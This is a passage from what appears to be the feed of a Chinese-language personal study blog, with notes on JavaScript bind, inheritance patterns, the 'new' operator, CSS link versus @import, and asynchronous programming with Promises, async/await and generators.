&#123;</span><br><span class="line">    var args = Array.prototype.slice.call(arguments);</span><br><span class="line">    var context = args.splice(0,1)[0];</span><br><span class="line">    var fn = this;</span><br><span class="line">    var res =  function() &#123;</span><br><span class="line">        let rest = Array.prototype.slice.call(arguments);</span><br><span class="line">        return fn.apply(context, args.concat(rest));</span><br><span class="line">    &#125;</span><br><span class="line">    if(this.prototype) &#123;</span><br><span class="line">        res.prototype = this.prototype;</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>最后还需要再找到一种方法来判断是否对bind之后的结果使用了new操作符。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = function() &#123;</span><br><span class="line">    var args = Array.prototype.slice.call(arguments);</span><br><span class="line">    var context = args.splice(0,1)[0];</span><br><span class="line">    var fn = this;</span><br><span class="line">    var noop = function() &#123;&#125;</span><br><span class="line">    var res =  function() &#123;</span><br><span class="line">        let rest = Array.prototype.slice.call(arguments);</span><br><span class="line">        // this只和运行的时候有关系，所以这里的this和上面的fn不是一码事，new res()和res()在调用的时            候，res中的this是不同的东西</span><br><span class="line">        return fn.apply(this instanceof noop ? this : context, args.concat(rest));</span><br><span class="line">    &#125;</span><br><span class="line">    if(this.prototype) &#123;</span><br><span class="line">        noop.prototype = this.prototype;</span><br><span class="line">    &#125;</span><br><span class="line">    res.prototype = new noop();</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>箭头函数能否当构造函数</li></ol><p>箭头函数表达式的语法比函数表达式更简洁，并且没有自己的<font color="#FF8C00">this，arguments，super或new.target</font>。箭头函数表达式更适用于那些本来需要匿名函数的地方，并且它<font color="#FF8C00">不能用作构造函数。</font></p><ol start="5"><li>继承，优缺点</li></ol><p>继承的好处<br>a：提高了代码的复用性<br>b：提高了代码的维护性<br>c：让类与类之间产生了关系，是多态的前提<br>继承的弊端<br>a：类的耦合性增强了,但是开发的原则：高内聚，低耦合。<br>6. js继承的方法和优缺点</p><p><strong>原型链继承</strong><br>实现方式：将子类的原型链指向父类的对象实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function Parent()&#123;</span><br><span class="line">  this.name = &quot;parent&quot;;</span><br><span class="line">  this.list = [&#x27;a&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.sayHi = function()&#123;</span><br><span class="line">  console.log(&#x27;hi&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">function Child()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = new Parent();</span><br><span class="line">var child = new Child();</span><br><span class="line">console.log(child.name);</span><br><span class="line">child.sayHi();</span><br></pre></td></tr></table></figure><p>原理：子类实例child的__proto__指向Child的原型链prototype，而Child.prototype指向Parent类的对象实例，该父类对象实例的__proto__指向Parent.prototype,所以Child可继承Parent的构造函数属性、方法和原型链属性、方法</p><p>优点：可继承构造函数的属性，父类构造函数的属性，父类原型的属性<br>缺点：<font color="#FF8C00">无法向父类构造函数传参</font>；且所有实例共享父类实例的属性，若父类共有属性为引用类型，一个子类实例更改父类构造函数共有属性时会导致继承的共有属性发生变化；实例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a = new Child();</span><br><span class="line">var b = new Child();</span><br><span class="line">a.list.push(&#x27;b&#x27;);</span><br><span class="line">console.log(b.list); // [&#x27;a&#x27;,&#x27;b&#x27;]</span><br></pre></td></tr></table></figure><p><strong>构造函数继承</strong><br>实现方式：在子类构造函数中使用call或者apply劫持父类构造函数方法，并传入参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function Parent(name, id)&#123;</span><br><span class="line">  this.id = id;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.printName = function()&#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.sayName = function()&#123;</span><br><span class="line">  console.log(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">function Child(name, id)&#123;</span><br><span class="line">  Parent.call(this, name, id);</span><br><span class="line">  // Parent.apply(this, arguments);</span><br><span class="line">&#125;</span><br><span class="line">var child = new Child(&quot;jin&quot;, &quot;1&quot;);</span><br><span class="line">child.printName(); // jin</span><br><span class="line">child.sayName() // Error</span><br></pre></td></tr></table></figure><p>原理：使用call或者apply更改子类函数的作用域，使this执行父类构造函数，子类因此可以继承父类共有属性<br>优点：可解决原型链继承的缺点<br>缺点：不可继承父类的原型链方法，构造函数<font color="#FF8C00">不可复用</font><br><strong>组合继承</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function Parent(name, id)&#123;</span><br><span class="line">  this.id = id;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.list = [&#x27;a&#x27;];</span><br><span class="line">  this.printName = function()&#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.sayName = function()&#123;</span><br><span class="line">  console.log(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">function Child(name, id)&#123;</span><br><span class="line">  Parent.call(this, name, id);</span><br><span class="line">  // Parent.apply(this, arguments);</span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = new Parent();</span><br><span class="line">var child = new Child(&quot;jin&quot;, &quot;1&quot;);</span><br><span class="line">child.printName(); // jin</span><br><span class="line">child.sayName() // jin</span><br><span class="line"></span><br><span class="line">var a = new Child();</span><br><span class="line">var b = new Child();</span><br><span class="line">a.list.push(&#x27;b&#x27;);</span><br><span class="line">console.log(b.list); // [&#x27;a&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理：综合使用构造函数继承和原型链继承<br>优点：可继承父类原型上的属性，且可传参；每个新实例引入的构造函数是私有的<br>缺点：<font color="#FF8C00">会执行两次父类的构造函数</font>，消耗较大内存，子类的构造函数会代替原型上的那个父类构造函数<br><strong>原型式继承</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var parent = &#123;</span><br><span class="line">  names: [&#x27;a&#x27;]</span><br><span class="line">&#125;</span><br><span class="line">function copy(object) &#123;</span><br><span class="line">  function F() &#123;&#125;</span><br><span class="line">  F.prototype = object;    </span><br><span class="line">  return new F();</span><br><span class="line">&#125;</span><br><span class="line">var child = copy(parent);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理：类似Object.create，用一个函数包装一个对象，然后返回这个函数的调用，这个函数就变成了个可以随意增添属性的实例或对象，结果是将子对象的__proto__指向父对象<br>缺点：<font color="#FF8C00">共享引用类型</font><br><strong>寄生式继承</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function createObject(obj) &#123;</span><br><span class="line">  var o = copy(obj);</span><br><span class="line">  o.getNames = function() &#123;</span><br><span class="line">    console.log(this.names);</span><br><span class="line">    return this.names;</span><br><span class="line">  &#125;</span><br><span class="line">  return o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理：二次封装原型式继承，并拓展<br>优点：可添加新的属性和方法<br><strong>寄生组合式继承</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function inheritPrototype(subClass, superClass) &#123;</span><br><span class="line">  // 复制一份父类的原型</span><br><span class="line">  var p = copy(superClass.prototype);</span><br><span class="line">  // 修正构造函数</span><br><span class="line">  p.constructor = subClass;</span><br><span class="line">  // 设置子类原型</span><br><span class="line">  subClass.prototype = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Parent(name, id)&#123;</span><br><span class="line">  this.id = id;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.list = [&#x27;a&#x27;];</span><br><span class="line">  this.printName = function()&#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.sayName = function()&#123;</span><br><span class="line">  console.log(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">function Child(name, id)&#123;</span><br><span class="line">  Parent.call(this, name, id);</span><br><span class="line">  // Parent.apply(this, arguments);</span><br><span class="line">&#125;</span><br><span class="line">inheritPrototype(Child, Parent);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理：改进组合继承，利用寄生式继承的思想继承原型<br>7. new会发生什么</p><ul><li>创建空对象；<br>var obj = {};</li><li>设置新对象的constructor属性为构造函数的名称，设置新对象的proto属性指向构造函数的prototype对象；<br>obj.proto = ClassA.prototype;<br>扩展了新对象的原型链。</li><li><font color="#FF00FF">使用新对象调用函数，函数中的this被指向新实例对象：</font><br>ClassA.call(obj);　　//{}.构造函数();</li><li><font color="#FF00FF">返回this指针。当存在显示的返回时，返回return后面的内容。新建的空对象作废。</font></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function test() &#123;</span><br><span class="line"> this.name = &quot;test&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> test.prototype = &#123;</span><br><span class="line"> a:&#123;&#125;,</span><br><span class="line"> b:&#123;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">var  c = new test();</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">每天/周学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>文件引入方式</title>
    <link href="https://merlynr.github.io/2022/08/03/%E6%96%87%E4%BB%B6%E5%BC%95%E5%85%A5%E6%96%B9%E5%BC%8F(%E7%AC%AC%E4%BA%94%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/03/%E6%96%87%E4%BB%B6%E5%BC%95%E5%85%A5%E6%96%B9%E5%BC%8F(%E7%AC%AC%E4%BA%94%E5%A4%A9)/</id>
    <published>2022-08-02T16:00:00.000Z</published>
    <updated>2022-08-02T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="link-和-import"><a href="#link-和-import" class="headerlink" title="link 和 @import"></a>link 和 @import</h1><p>作用：样式的导入方式</p><p><strong>link的使用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=&quot;index.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>@import 的使用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">@import url(index.css);</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>link 和 @import 的区别</p><ol><li>引入的内容不同<br><font color="#FF00FF">link 除了引用样式文件，还可以引用图片等资源文件，而 @import 只引用样式文件</font></li><li>加载顺序不同<br><font color="#FF8C00">link 引用 CSS 时，在页面载入时同时加载；@import 需要页面网页完全载入以后加载</font></li><li>兼容性不同<br><font color="#FF8C00">link 是 XHTML 标签，无兼容问题；@import 是在 CSS2.1 提出的，低版本的浏览器不支持</font></li><li>对 JS 的支持不同<br><font color="#FF00FF">link 支持使用 Javascript 控制 DOM 去改变样式；而 @import 不支持</font><h1 id="为什么link用href获取资源-script和img用src"><a href="#为什么link用href获取资源-script和img用src" class="headerlink" title="为什么link用href获取资源 script和img用src"></a>为什么link用href获取资源 script和img用src</h1><font color="#DC143C">src用于替换当前元素，href用于在当前文档和引用资源之间确立联系。</font></li></ol><p><strong>src</strong><br>src是source的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将其指向的资源下载并应用到文档内，例如js脚本，img图片和frame等元素<br><font color="#FF8C00">当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架 等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部</font><br><strong>href</strong></p><ul><li>href是Hypertext Reference的缩写，指向网络资源所在位置，<font color="#FF8C00">建立和当前元素（锚点）或当前文档（链接）之间的链接</font></li><li>在文档中添加link标签，浏览器会识别该文档为css文件，就会<font color="#FF8C00">并行下载资源并且不会停止对当前文档的处理</font>。这也是为什么建议使用link方式来加载css，而不是使用@import方式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=&quot;common.css&quot; rel=&quot;stylesheet&quot;/&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>异步相关(第三天)</title>
    <link href="https://merlynr.github.io/2022/08/02/%E5%BC%82%E6%AD%A5%E7%9B%B8%E5%85%B3(%E7%AC%AC%E4%B8%89%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/02/%E5%BC%82%E6%AD%A5%E7%9B%B8%E5%85%B3(%E7%AC%AC%E4%B8%89%E5%A4%A9)/</id>
    <published>2022-08-01T16:00:00.000Z</published>
    <updated>2022-08-01T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<ol><li>promise和 async await 区别</li></ol><p><strong>概念</strong><br>Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大，简单地说，<font color="#FF8C00">Promise好比容器，里面存放着一些未来才会执行完毕（异步）的事件的结果</font>，而这些结果一旦生成是<font color="#FF8C00">无法改变</font>的</p><p>async await也是异步编程的一种解决方案，他遵循的是Generator 函数的语法糖，<font color="#FF8C00">他拥有内置执行器，不需要额外的调用直接会自动执行并输出结果</font>，它<font color="#FF00FF">返回的是一个Promise对象</font>。</p><p><strong>两者的区别</strong><br>Promise的出现解决了传统callback函数导致的“地域回调”问题，但它的语法导致了它向纵向发展行成了一个<font color="#FF8C00">回调链</font>，遇到复杂的业务场景，这样的语法显然也是不美观的。而async await代码看起来会简洁些，使得异步代码看起来像同步代码，await的本质是可以<font color="#FF8C00">提供等同于”同步效果“的等待异步返回能力的语法糖，</font>只有这一句代码执行完，才会执行下一句。<br>async await与Promise一样，是<font color="#FF00FF">非阻塞</font>的。<br>async await是基于Promise实现的，可以说是改良版的Promise，它<font color="#FF00FF">不能用于普通的回调函数</font>。</p><ol start="2"><li>defer和async区别</li></ol><p>区别主要在于一个执行时间,defer会在文档解析完之后执行,并且多个defer<font color="#FF8C00">会按照顺序执行</font>,而async则是在js加载好之后就会执行,并且多个async,<font color="#FF8C00">哪个加载好就执行哪个</font><br><strong>解析：</strong><br>在没有defer或者async的情况下：会立即执行脚本,所以通常建议把script放在body最后<br><strong>async：</strong> 有async的话,加载和渲染后续文档元素的过程将和 script.js 的加载与执行<font color="#FF00FF">并行进行（异步）。</font><font color="#FF00FF">但是多个js文件的加载顺序不会按照书写顺序进行</font><br><strong>derer：</strong> 有derer的话,加载后续文档元素的过程将和 script.js 的加载<font color="#FF00FF">并行进行（异步</font>），但是<font color="#FF00FF"> script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成,并且多个defer会按照顺序进行加载。</font></p><ol start="3"><li>同步和异步</li></ol><p><strong>同步</strong><br>指在 主线程上排队执行的任务，只有前一个任务执行完毕，才能继续执行下一个任务。<br>也就是调用一旦开始，必须这个调用 返回结果(划重点——）才能继续往后执行。程序的执行顺序和任务排列顺序是一致的。<br><strong>异步</strong><br><font color="#FF8C00">异步任务是指不进入主线程，而进入任务队列的任务，只有任务队列通知主线程，某个异步任务可以执行了，该任务才会进入主线程。</font><br>每一个任务有一个或多个回调函数。<font color="#FF00FF">前一个任务结束后，不是执行后一个任务,而是执行回调函数</font>，后一个任务<font color="#FF00FF">则是不等前一个任务结束就执行。</font><br>程序的执行顺序和任务的排列顺序是不一致的，异步的。<br>我们常用的setTimeout和setInterval函数，Ajax都是异步操作。</p><ol start="4"><li>实现异步的方法</li></ol><p>回调函数（Callback）、事件监听、发布订阅、Promise/A+、生成器Generators/ yield、async/await<br>JS 异步编程进化史：<font color="#FF00FF">callback -&gt; promise -&gt; generator -&gt; async + await</font><br><font color="#FF8C00">async/await 函数的实现，</font>就是将 Generator 函数和自动执行器，包装在一个函数里。<br>async/await可以说是异步终极解决方案了。</p><p>(1) async/await函数相对于Promise，优势体现在：</p><p>处理 then 的调用链，能够更清晰准确的写出代码<br>并且也能优雅地解决回调地狱问题。<br>当然async/await函数也存在一些缺点，因为 await 将异步代码改造成了同步代码，<font color="#FF00FF">如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低，代码没有依赖性的话，完全可以使用 Promise.all 的方式。</font></p><p>(2) async/await函数对 Generator 函数的改进，体现在以下三点：</p><p><font color="#FF8C00">内置执行器。</font> Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，async 函数的执行，与普通函数一模一样，只要一行。<br><font color="#FF8C00">更广的适用性</font>。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）。<br><font color="#FF8C00">更好的语义。</font> async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await <font color="#FF00FF">表示紧跟在后面的表达式需要等待结果</font>。</p><p><strong>回调函数（Callback）</strong><br>回调函数是异步操作最基本的方法。以下代码就是一个回调函数的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ajax(url, () =&gt; &#123;</span><br><span class="line">    // 处理逻辑</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>但是回调函数有一个致命的弱点，就是容易写出<strong>回调地狱（Callback hell</strong>）。假设多个请求存在依赖性，你可能就会写出如下代码：</p><figure class="highlight plaintext"><figcaption><span>() </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    // 处理逻辑</span><br><span class="line">    ajax(url1, () =&gt; &#123;</span><br><span class="line">        // 处理逻辑</span><br><span class="line">        ajax(url2, () =&gt; &#123;</span><br><span class="line">            // 处理逻辑</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>回调函数的优点是简单、容易理解和实现，缺点是不利于代码的阅读和维护，各个部分之间高度耦合，使得程序结构混乱、流程难以追踪（尤其是多个回调函数嵌套的情况），而且每个任务只能指定一个回调函数。<font color="#FF00FF">此外它不能使用 try catch 捕获错误，不能直接 return</font>。<br><strong>事件监听</strong><br>这种方式下，<strong>异步任务的执行不取决于代码的顺序，而<font color="#FF00FF">取决于某个事件是否发生</font>。</strong><br>下面是两个函数f1和f2，编程的意图是f2必须等到f1执行完成，才能执行。首先，为f1绑定一个事件（这里采用的jQuery的写法）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1.on(&#x27;done&#x27;, f2);</span><br></pre></td></tr></table></figure><p>上面这行代码的意思是，当f1发生done事件，就执行f2。然后，对f1进行改写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function f1() &#123;</span><br><span class="line">  setTimeout(function () &#123;</span><br><span class="line">    // ...</span><br><span class="line">    f1.trigger(&#x27;done&#x27;);</span><br><span class="line">  &#125;, 1000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，f1.trigger(‘done’)表示，执行完成后，立即触发done事件，从而开始执行f2。<br>这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以”去耦合”，有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。阅读代码的时候，很难看出主流程。<br><strong>发布订阅</strong><br>我们假定，存在一个”信号中心”，某个任务执行完成，就向信号中心”发布”（publish）一个信号，其他任务可以向信号中心”订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”发布/订阅模式”（publish-subscribe pattern），又称”观察者模式”（observer pattern）。</p><p>这种方法的性质与“事件监听”类似，但是明显优于后者。因为可以通过查看“消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。<br><strong>Promise/A+</strong><br>Promise本意是承诺，在程序中的意思就是承诺我过一段时间后会给你一个结果。 什么时候会用到过一段时间？答案是异步操作，异步是指可能比较长时间才有结果的才做，例如网络请求、读取本地文件等<br><font color="#FF8C00">三种状态</font><br>Pending—-Promise对象实例创建时候的初始状态<br>Fulfilled—-可以理解为成功的状态<br>Rejected—-可以理解为失败的状态</p><p><img src="http://files.shanqianche.cn/20228/1659430720168.png" alt="Promise状态"><br><font color="#FF8C00">这个承诺一旦从等待状态变成为其他状态就永远不能更改状态了</font><br>promise的链式调用</p><ul><li>每次调用返回的都是一<font color="#FF00FF">个新的Promise实例(这就是then可用链式调用的原因)</font></li><li>如果then中返回的是一个结果的话会把这个结果传递下一次then中的<font color="#FF8C00">成功</font>回调</li><li>如果then中出现异常,会走下一个then的<font color="#FF8C00">失败</font>回调</li><li>在then中<font color="#FF8C00">使用了return，那么return的值会被Promise.resolve()</font> </li><li>then中可以不传递参数，如果不传递会透到下一个then中</li><li>catch 会捕获到没有捕获的异常</li><li>也是存在一些缺点的，<font color="#FF00FF">比如无法取消 Promise，错误需要通过回调函数捕获</font>。</li></ul><p><strong>生成器Generators/ yield</strong><br>Generator 函数是 ES6 提供的一种异步编程解决方案，语法行为与传统函数完全不同，Generator 最大的特点就是<font color="#FF8C00">可以控制函数的执行</font>。</p><p>语法上，首先可以把它理解成，<font color="#DEB887">Generator 函数是一个状态机，封装了多个内部状态</font>。<br>Generator 函数除了状态机，还是一个<font color="#FF00FF">遍历器对象生成函数</font>。<br>可暂停函数, <font color="#FF00FF">yield可暂停，next方法可启动，每次返回的是yield后的表达式结果</font>。<br><font color="#FF00FF">yield表达式本身没有返回值，或者说总是返回undefined。next方法可以带一个参数，该参数就会被当作上一个yield表达式的返回值。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function *foo(x) &#123;</span><br><span class="line">  let y = 2 * (yield (x + 1))</span><br><span class="line">  let z = yield (y / 3)</span><br><span class="line">  return (x + y + z)</span><br><span class="line">&#125;</span><br><span class="line">let it = foo(5)</span><br><span class="line">console.log(it.next())   // =&gt; &#123;value: 6, done: false&#125;</span><br><span class="line">console.log(it.next(12)) // =&gt; &#123;value: 8, done: false&#125;</span><br><span class="line">console.log(it.next(13)) // =&gt; &#123;value: 42, done: true&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可能结果跟你想象不一致，接下来我们逐行代码分析：<br>首先 Generator 函数调用和普通函数不同，它会返回一个迭代器<br>当执行第一次 next 时，传参会被忽略，并且函数暂停在 yield (x + 1) 处，所以返回 5 + 1 = 6<br>当执行第二次 next 时，传入的参数12就会被当作上一个yield表达式的返回值，如果你不传参，yield 永远返回 undefined。此时 let y = 2 * 12，所以第二个 yield 等于 2 * 12 / 3 = 8<br>当执行第三次 next 时，传入的参数13就会被当作上一个yield表达式的返回值，所以 z = 13, x = 5, y = 24，相加等于 42<br><strong>async/await</strong><br>使用async/await，你可以轻松地达成之前使用生成器和co函数所做到的工作,它有如下特点：</p><ul><li>async/await是基于Promise实现的，它<font color="#FF8C00">不能用于普通的回调函数</font>。</li><li>async/await与Promise一样，是非阻塞的。</li><li>async/await使得异步代码看起来像同步代码，这正是它的魔力所在。</li></ul><p><font color="#FF00FF">怎么解决callback多层嵌套</font>Promises、Async/await<br><strong>Promise.all(iterable)</strong><br>Promise.all方法接受一个数组作为参数，p1、p2、p3都是Promise实例，如果不是，就会先调用下面讲到的Promise.resolve方法，将参数转为Promise实例，再进一步处理。（Promise.all方法的参数可以不是数组，但必须具有Iterator接口，且返回的每个成员都是Promise实例。）<br>p的状态由p1、p2、p3决定，分成两种情况。<br>(1) 只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。<br>(2) 只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">const p1 = &#x27;p1-ok&#x27;;</span><br><span class="line">const p2 = Promise.resolve(&#x27;p2-ok&#x27;);</span><br><span class="line">const p3 = new Promise((resolve) =&gt; setTimeout(resolve, 3000, &#x27;p3-ok&#x27;));</span><br><span class="line">const p4 = Promise.reject(&#x27;p4-err&#x27;);</span><br><span class="line">Promise.all([p1, p2, p3])</span><br><span class="line">    .then((resolves) =&gt; &#123;</span><br><span class="line">      resolves.forEach(resolve =&gt; &#123;</span><br><span class="line">          console.log(resolve); //p1-ok   p2-ok  p3-ok</span><br><span class="line">      &#125;);</span><br><span class="line">    